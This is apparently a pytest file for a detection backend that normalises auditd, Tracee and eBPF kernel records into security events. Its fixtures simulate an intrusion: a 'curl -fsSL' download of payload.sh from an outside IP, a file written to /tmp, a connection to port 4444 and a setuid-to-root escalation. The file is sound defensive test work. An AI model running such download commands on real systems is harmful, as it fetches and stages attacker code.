"""Tests for M3 kernel-record normalisation (auditd, Tracee, eBPF)."""

from __future__ import annotations

from backend.core.events import EventKind
from backend.telemetry.parsers import AuditRecordParser, _parse_saddr, normalize_kernel_record


def _run_parser(lines):
    parser = AuditRecordParser()
    out = []
    for line in lines:
        out.extend(parser.feed(line))
    out.extend(parser.flush())
    return out


SYSCALL = 'type=SYSCALL msg=audit({ts}:{serial}): arch=c000003e syscall={syscall} success={ok} exit={exit} a0={a0} a1=7ffd a2=16 a3=0 items=1 ppid={ppid} pid={pid} auid=1000 uid={uid} gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm="{comm}" exe="{exe}" key="{key}"'


def test_auditd_execve_emits_create_and_exec():
    lines = [
        SYSCALL.format(ts=1710000000.123, serial=1001, syscall=59, ok="yes", exit=0, a0="55c4d", ppid=1200, pid=1300, uid=1000, comm="bash", exe="/usr/bin/bash", key="web"),
        'type=EXECVE msg=audit(1710000000.123:1001): argc=3 a0="curl" a1="-fsSL" a2="http://185.220.101.42/payload.sh"',
        'type=PATH msg=audit(1710000000.123:1001): item=0 name="/usr/bin/bash" inode=1234 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL',
    ]
    events = _run_parser(lines)
    assert [e.kind for e in events] == [EventKind.PROCESS_CREATED, EventKind.EXEC]
    assert events[0].exe == "/usr/bin/bash"
    assert events[0].pid == 1300
    assert events[0].ppid == 1200
    assert events[1].cmdline == ("curl", "-fsSL", "http://185.220.101.42/payload.sh")


def test_auditd_connect_emits_network_event():
    lines = [
        SYSCALL.format(ts=1710000001.456, serial=1002, syscall=42, ok="yes", exit=0, a0="3", ppid=1300, pid=1301, uid=1000, comm="bash", exe="/usr/bin/curl", key="web"),
        'type=SOCKADDR msg=audit(1710000001.456:1002): saddr=02000050A8E01DBA7F0000000000000000',
    ]
    events = _run_parser(lines)
    assert len(events) == 1
    event = events[0]
    assert event.kind == EventKind.NETWORK_CONNECT
    assert event.details["remote_ip"] == "168.224.29.186"
    assert event.details["remote_port"] == 80


def test_auditd_successive_events_flush_in_order():
    exec_lines = [
        SYSCALL.format(ts=1710000000.123, serial=1001, syscall=59, ok="yes", exit=0, a0="x", ppid=1200, pid=1300, uid=1000, comm="bash", exe="/usr/bin/bash", key="web"),
        'type=EXECVE msg=audit(1710000000.123:1001): argc=1 a0="bash"',
    ]
    conn_lines = [
        SYSCALL.format(ts=1710000001.456, serial=1002, syscall=42, ok="yes", exit=0, a0="3", ppid=1300, pid=1301, uid=1000, comm="bash", exe="/usr/bin/curl", key="web"),
        'type=SOCKADDR msg=audit(1710000001.456:1002): saddr=02000050A8E01DBA',
    ]
    events = _run_parser(exec_lines + conn_lines)
    assert [e.kind for e in events] == [
        EventKind.PROCESS_CREATED,
        EventKind.EXEC,
        EventKind.NETWORK_CONNECT,
    ]


def test_auditd_openat_in_tmp_is_file_write():
    lines = [
        SYSCALL.format(ts=1710000002.100, serial=1003, syscall=257, ok="yes", exit=3, a0="ffffff9c", ppid=1301, pid=1302, uid=1000, comm="curl", exe="/usr/bin/curl", key="web"),
        'type=PATH msg=audit(1710000002.100:1003): item=0 name="/tmp/payload.sh" inode=999 dev=08:01 mode=0100644 ouid=1000 ogid=1000 rdev=00:00 nametype=NORMAL',
    ]
    events = _run_parser(lines)
    assert len(events) == 1
    assert events[0].kind == EventKind.FILE_WRITE
    assert events[0].details["path"] == "/tmp/payload.sh"


def test_auditd_regular_read_is_file_read():
    lines = [
        SYSCALL.format(ts=1710000002.200, serial=1004, syscall=257, ok="yes", exit=3, a0="ffffff9c", ppid=1301, pid=1302, uid=1000, comm="cat", exe="/usr/bin/cat", key="web"),
        'type=PATH msg=audit(1710000002.200:1004): item=0 name="/home/dev/notes.txt" inode=500 dev=08:01 mode=0100644 ouid=1000 ogid=1000 rdev=00:00 nametype=NORMAL',
    ]
    events = _run_parser(lines)
    assert len(events) == 1
    assert events[0].kind == EventKind.FILE_READ


def test_auditd_setuid_is_privilege_escalation():
    lines = [
        SYSCALL.format(ts=1710000003.200, serial=1005, syscall=105, ok="yes", exit=0, a0="0", ppid=1303, pid=1304, uid=1000, comm="bash", exe="/usr/bin/bash", key="escalation"),
    ]
    events = _run_parser(lines)
    assert len(events) == 1
    event = events[0]
    assert event.kind == EventKind.PRIVILEGE_ESCALATION
    assert event.details["from_uid"] == 1000
    assert event.details["to_uid"] == 0


def test_auditd_failed_syscalls_are_skipped():
    lines = [
        SYSCALL.format(ts=1710000004.000, serial=1006, syscall=59, ok="no", exit=-13, a0="x", ppid=1, pid=99, uid=0, comm="bash", exe="/usr/bin/false", key="web"),
    ]
    assert _run_parser(lines) == []


def test_auditd_unrelated_records_ignored():
    lines = [
        'type=DAEMON_START msg=audit(1710000005.000:1007): op=start ver=3.0.7 format=enriched',
        'type=AVC msg=audit(1710000005.001:1008): apparmor="DENIED" operation=open profile=foo',
    ]
    assert _run_parser(lines) == []


def test_auditd_garbage_line_ignored():
    assert _run_parser(["not an audit line"]) == []


def test_saddr_inet():
    assert _parse_saddr("02000050A8E01DBA") == ("168.224.29.186", 80)


def test_saddr_inet6():
    hexstr = "0A000050" "00000000" "20010db8000000000000000000000001" "00000000"
    assert _parse_saddr(hexstr) == ("2001:db8:0:0:0:0:0:1", 80)


def test_tracee_execve():
    events = normalize_kernel_record(
        {
            "timestamp": 1710000000123456789,
            "processId": 1300,
            "parentProcessId": 1200,
            "userId": 1000,
            "eventName": "execve",
            "args": [
                {"name": "pathname", "value": "/usr/bin/curl"},
                {"name": "argv", "value": "curl -fsSL http://185.220.101.42/payload.sh"},
            ],
            "returnValue": 0,
        }
    )
    assert [e.kind for e in events] == [EventKind.PROCESS_CREATED, EventKind.EXEC]
    assert events[1].cmdline == ("curl", "-fsSL", "http://185.220.101.42/payload.sh")


def test_tracee_connect():
    events = normalize_kernel_record(
        {
            "processId": 1300,
            "parentProcessId": 1200,
            "userId": 1000,
            "eventName": "connect",
            "args": [{"name": "sockaddr", "value": "185.220.101.42:4444"}],
            "returnValue": 0,
        }
    )
    assert len(events) == 1
    assert events[0].kind == EventKind.NETWORK_CONNECT
    assert events[0].details["remote_ip"] == "185.220.101.42"
    assert events[0].details["remote_port"] == 4444


def test_tracee_openat_write_flags():
    events = normalize_kernel_record(
        {
            "processId": 1301,
            "parentProcessId": 1300,
            "eventName": "openat",
            "args": [
                {"name": "pathname", "value": "/tmp/payload.sh"},
                {"name": "flags", "value": "65"},
            ],
            "returnValue": 3,
        }
    )
    assert len(events) == 1
    assert events[0].kind == EventKind.FILE_WRITE


def test_tracee_setuid():
    events = normalize_kernel_record(
        {
            "processId": 1304,
            "parentProcessId": 1303,
            "userId": 1000,
            "eventName": "setuid",
            "args": [{"name": "uid", "value": 0}],
            "returnValue": 0,
        }
    )
    assert len(events) == 1
    assert events[0].kind == EventKind.PRIVILEGE_ESCALATION
    assert events[0].details["to_uid"] == 0


def test_tracee_failed_syscall_skipped():
    assert (
        normalize_kernel_record(
            {"eventName": "execve", "processId": 1, "returnValue": -13, "args": []}
        )
        == []
    )


def test_tracee_unknown_event_skipped():
    assert normalize_kernel_record({"eventName": "futex", "processId": 1, "returnValue": 0, "args": []}) == []


def test_bpf_style_record_execve():
    events = normalize_kernel_record(
        {
            "pid": 1300,
            "ppid": 1200,
            "uid": 1000,
            "name": "execve",
            "exe": "/usr/bin/curl",
            "argv": ["curl", "-fsSL", "http://x"],
            "return_value": 0,
        }
    )
    assert [e.kind for e in events] == [EventKind.PROCESS_CREATED, EventKind.EXEC]
    assert events[1].cmdline == ("curl", "-fsSL", "http://x")


# -- M8: real-world audit record handling --------------------------------
def _syscall_line(**kw):
    """SYSCALL record with explicit register args (a1/a2 carry open flags)."""
    tpl = (
        'type=SYSCALL msg=audit({ts}:{serial}): arch=c000003e syscall={syscall} '
        'success={ok} exit={exit} a0={a0} a1={a1} a2={a2} a3={a3} items=1 '
        'ppid={ppid} pid={pid} auid=1000 uid={uid} gid=1000 euid=1000 suid=1000 '
        'fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 '
        'comm="{comm}" exe="{exe}" key="{key}"'
    )
    defaults = dict(
        ts=0, serial=0, syscall=0, ok="yes", exit=0, a0="0", a1="7ffd", a2="16",
        a3="0", ppid=0, pid=0, uid=0, comm="-", exe="-", key="-",
    )
    defaults.update(kw)
    return tpl.format(**defaults)


def test_auditd_openat_write_flags_detected():
    """openat with O_CREAT|O_WRONLY (a2=0x41) to a non-suspicious path is a write."""
    lines = [
        _syscall_line(ts=1710000005.100, serial=2001, syscall=257, exit=3, a0="ffffff9c", a1="55f0", a2="0x41", ppid=1301, pid=1302, uid=1000, comm="bash", exe="/usr/bin/bash", key="web"),
        'type=PATH msg=audit(1710000005.100:2001): item=0 name="/home/dev/cache.json" inode=12 dev=08:01 mode=0100644 ouid=1000 ogid=1000 rdev=00:00 nametype=NORMAL',
    ]
    events = _run_parser(lines)
    assert len(events) == 1
    assert events[0].kind == EventKind.FILE_WRITE
    assert events[0].details["flags"] == 0x41


def test_auditd_openat_read_flags_detected():
    """openat with O_RDONLY (a2=0) to a non-suspicious path is a read."""
    lines = [
        _syscall_line(ts=1710000005.200, serial=2002, syscall=257, exit=3, a0="ffffff9c", a1="55f0", a2="0", ppid=1301, pid=1302, uid=1000, comm="cat", exe="/usr/bin/cat", key="web"),
        'type=PATH msg=audit(1710000005.200:2002): item=0 name="/home/dev/notes.txt" inode=500 dev=08:01 mode=0100644 ouid=1000 ogid=1000 rdev=00:00 nametype=NORMAL',
    ]
    events = _run_parser(lines)
    assert len(events) == 1
    assert events[0].kind == EventKind.FILE_READ


def test_auditd_path_record_ignores_uninformative_nametype():
    """PATH records that don't describe a real file must not win the path."""
    lines = [
        _syscall_line(ts=1710000006.100, serial=2003, syscall=257, exit=3, a0="ffffff9c", a1="55f0", a2="0", ppid=1301, pid=1302, uid=1000, comm="cat", exe="/usr/bin/cat", key="web"),
        'type=PATH msg=audit(1710000006.100:2003): item=0 name="/proc/self/mem" inode=999 dev=00:04 mode=0 rdev=00:00 nametype=UNKNOWN',
        'type=PATH msg=audit(1710000006.100:2003): item=1 name="/home/dev/notes.txt" inode=500 dev=08:01 mode=0100644 ouid=1000 ogid=1000 rdev=00:00 nametype=NORMAL',
    ]
    events = _run_parser(lines)
    assert len(events) == 1
    assert events[0].details["path"] == "/home/dev/notes.txt"


def test_auditd_execve_truncated_argv():
    """audit caps argv; missing trailing aN must not become empty entries."""
    lines = [
        SYSCALL.format(ts=1710000007.100, serial=2004, syscall=59, ok="yes", exit=0, a0="55c4d", ppid=1200, pid=1300, uid=1000, comm="curl", exe="/usr/bin/curl", key="web"),
        'type=EXECVE msg=audit(1710000007.100:2004): argc=3 a0="curl" a1="-fsSL"',
    ]
    events = _run_parser(lines)
    assert [e.kind for e in events] == [EventKind.PROCESS_CREATED, EventKind.EXEC]
    assert events[1].cmdline == ("curl", "-fsSL")


def test_auditd_execve_null_args_skipped():
    lines = [
        SYSCALL.format(ts=1710000008.100, serial=2005, syscall=59, ok="yes", exit=0, a0="55c4d", ppid=1200, pid=1300, uid=1000, comm="bash", exe="/usr/bin/bash", key="web"),
        'type=EXECVE msg=audit(1710000008.100:2005): argc=2 a0="bash" a1="(null)"',
    ]
    events = _run_parser(lines)
    assert events[1].cmdline == ("bash",)


REAL_AUDIT_LOG = """\
type=EXECVE msg=audit(1678800000.123:1001): argc=3 a0="curl" a1="-fsSL" a2="http://185.220.101.42/payload.sh"
type=CWD msg=audit(1678800000.123:1001): cwd="/home/dev"
type=PATH msg=audit(1678800000.123:1001): item=0 name="/usr/bin/curl" inode=1234 dev=08:01 mode=0100755 ouid=0 ogid=0 rdev=00:00 nametype=NORMAL
type=SYSCALL msg=audit(1678800000.123:1001): arch=c000003e syscall=59 success=yes exit=0 a0=7ffd2d4b a1=7ffd2d4b a2=7ffd2d4b a3=7ffd2d4b items=1 ppid=1200 pid=1300 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm="curl" exe="/usr/bin/curl" key="web"
type=PROCTITLE msg=audit(1678800000.123:1001): proctitle=6375726C2D6673534C2D30
type=SYSCALL msg=audit(1678800001.456:1002): arch=c000003e syscall=42 success=yes exit=0 a0=3 a1=7fdb a2=10 a3=0 items=0 ppid=1300 pid=1301 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm="curl" exe="/usr/bin/curl" key="web"
type=SOCKADDR msg=audit(1678800001.456:1002): saddr=02000050A8E01DBA
type=SYSCALL msg=audit(1678800003.200:1003): arch=c000003e syscall=105 success=yes exit=0 a0=0 a1=0 a2=0 a3=0 items=0 ppid=1303 pid=1304 auid=1000 uid=1000 gid=1000 euid=1000 suid=1000 fsuid=1000 egid=1000 sgid=1000 fsgid=1000 tty=pts0 ses=3 comm="bash" exe="/usr/bin/bash" key="escalation"
type=SYSCALL msg=audit(1678800004.000:1004): arch=c000003e syscall=59 success=no exit=-13 a0=55c4d a1=0 a2=0 a3=0 items=1 ppid=1 pid=99 auid=1000 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=pts0 ses=3 comm="false" exe="/usr/bin/false" key="web"
"""


def test_parser_on_real_audit_log_order():
    """Records arrive in real auditd order (EXECVE/PATH before SYSCALL)."""
    events = _run_parser(REAL_AUDIT_LOG.splitlines())
    kinds = [e.kind for e in events]
    assert kinds == [
        EventKind.PROCESS_CREATED,
        EventKind.EXEC,
        EventKind.NETWORK_CONNECT,
        EventKind.PRIVILEGE_ESCALATION,
    ]
    assert events[0].exe == "/usr/bin/curl"
    assert events[1].cmdline == ("curl", "-fsSL", "http://185.220.101.42/payload.sh")
    assert events[2].details["remote_ip"] == "168.224.29.186"
    assert events[3].details["to_uid"] == 0


def test_auditd_provider_replays_real_log(monkeypatch, tmp_path):
    """End-to-end: audit log source + parser behind the provider contract."""
    import backend.telemetry.auditd_provider as auditd_mod
    from backend.telemetry.auditd_provider import AuditdProvider

    monkeypatch.setattr(auditd_mod, "require_linux", lambda name: None)
    log = tmp_path / "audit.log"
    log.write_text("", encoding="utf-8")

    provider = AuditdProvider(log_path=str(log))
    provider.start()
    try:
        with log.open("a", encoding="utf-8") as fh:
            fh.write(REAL_AUDIT_LOG)
        events = provider.collect()
        kinds = [e.kind for e in events]
        assert EventKind.EXEC in kinds
        assert EventKind.NETWORK_CONNECT in kinds
        assert EventKind.PRIVILEGE_ESCALATION in kinds
        health = provider.status()
        assert health.running
        assert health.events_delivered == len(events)
        assert health.source["path"] == str(log)
    finally:
        provider.stop()
